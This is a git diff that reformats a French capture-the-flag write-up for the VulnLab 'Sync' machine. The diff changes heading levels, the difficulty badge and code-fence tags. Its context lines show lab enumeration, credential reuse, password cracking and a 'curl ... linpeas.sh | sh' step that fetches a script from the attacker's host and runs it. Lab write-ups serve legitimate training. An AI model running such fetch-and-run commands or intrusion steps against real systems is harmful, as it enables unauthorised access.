@@ -7,8 +7,8 @@ template: doc
 sidebar:
   order: 6
   badge:
-    text: 'medium'
-    variant: caution
+    text: 'easy'
+    variant: success
 ---
 
 import { Image } from 'astro:assets';
@@ -16,13 +16,11 @@ import banner from '../../../../assets/writeup/vulnlab/banner.jpeg';
 
 <Image src={banner} alt="banner" format="avif" quality={"mid"}/>
 
-# SYNC
-
 | OS | Difficulty | Target |
 |----|----|----|
 | Linux | <span style="color:green">**EASY**</span> | 10.10.124.199 |
 
-# 🔭 Enumeration
+## 🔭 Enumeration
 
 ```sh
 PORT    STATE SERVICE
@@ -88,7 +86,7 @@ Le fichier `www/index.php` contient un hash:
 
 La `db` nous donne quelques informations complémentaires:
 
-```sqlite
+```sql
 sqlite3 db/site.db                             
 SQLite version 3.40.1 2022-12-28 14:03:47
 Enter ".help" for usage hints.
@@ -148,7 +146,7 @@ triss@10.10.124.199: Permission denied (publickey).
 
 Via le ftp nous sommes dans un dossier `/home`:
 
-```ftp
+```sh
 ftp> ls -la
 229 Entering Extended Passive Mode (|||9885|)
 150 Here comes the directory listing.
@@ -188,7 +186,7 @@ triss@ip-10-10-200-238:/home$ cd jennifer
 -bash: cd: jennifer: Permission denied
 ```
 
-# 👣 Foothold
+## 👣 Foothold
 
 Connecté en ssh avec `Triss`, nous ne pouvons rien faire. Nous décidons de tenter avec le même mot de passe de nous connecté à `sa`, `ubuntu` et `jennifer`.
 Sans succès pour les deux premiers mais fonctionnel pour `Jennifer`:
@@ -216,7 +214,7 @@ curl http://10.8.3.147/linpeas.sh | sh
 
 Nous avons donc un dossier `/backup` à la racine et un script `backup.sh`appartenant à `sa`.
 
-# 🔄 Lateral Movement
+## 🔄 Lateral Movement
 
 Le but désormais est d'obtenir le mot de passe de `sa` pour se connecter à cet utilisateur et ensuite de voir ce qu'il y a dans `backup.sh`.
 
@@ -338,7 +336,7 @@ Session completed.
 
 Le mot de passe de `sa` est récupéré. Voyons comment gagner en privilèges.
 
-# 🎯 Privilege Escalation
+## 🎯 Privilege Escalation
 
 Connecté en `sa`.
 
